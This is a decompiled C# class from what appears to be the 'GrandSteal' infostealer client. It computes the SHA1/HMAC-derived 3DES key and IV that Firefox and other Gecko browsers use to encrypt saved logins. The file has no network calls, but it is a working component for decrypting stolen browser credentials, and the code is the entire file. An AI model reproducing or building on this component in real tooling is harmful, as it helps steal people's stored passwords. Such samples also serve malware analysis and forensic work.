using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace GrandSteal.Client.Data.Gecko
{
	// Token: 0x02000028 RID: 40
	public class GeckoPasswordBasedEncryption
	{
		// Token: 0x17000037 RID: 55
		// (get) Token: 0x060000EF RID: 239 RVA: 0x000025C2 File Offset: 0x000007C2
		private byte[] _globalSalt
		{
			[CompilerGenerated]
			get
			{
				return this.<_globalSalt>k__BackingField;
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x060000F0 RID: 240 RVA: 0x000025CA File Offset: 0x000007CA
		private byte[] _masterPassword
		{
			[CompilerGenerated]
			get
			{
				return this.<_masterPassword>k__BackingField;
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x060000F1 RID: 241 RVA: 0x000025D2 File Offset: 0x000007D2
		private byte[] _entrySalt
		{
			[CompilerGenerated]
			get
			{
				return this.<_entrySalt>k__BackingField;
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x060000F2 RID: 242 RVA: 0x000025DA File Offset: 0x000007DA
		// (set) Token: 0x060000F3 RID: 243 RVA: 0x000025E2 File Offset: 0x000007E2
		public byte[] DataKey
		{
			get;
			private set;
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060000F4 RID: 244 RVA: 0x000025EB File Offset: 0x000007EB
		// (set) Token: 0x060000F5 RID: 245 RVA: 0x000025F3 File Offset: 0x000007F3
		public byte[] DataIV
		{
			get;
			private set;
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x000025FC File Offset: 0x000007FC
		public GeckoPasswordBasedEncryption(byte[] salt, byte[] password, byte[] entry)
		{
			this.<_globalSalt>k__BackingField = salt;
			this.<_masterPassword>k__BackingField = password;
			this.<_entrySalt>k__BackingField = entry;
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00007FF8 File Offset: 0x000061F8
		public void Calculate()
		{
			SHA1CryptoServiceProvider arg_4F_0 = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = arg_4F_0.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = arg_4F_0.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hMACSHA = new HMACSHA1(key))
			{
				array6 = hMACSHA.ComputeHash(array5);
				byte[] array7 = hMACSHA.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hMACSHA.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
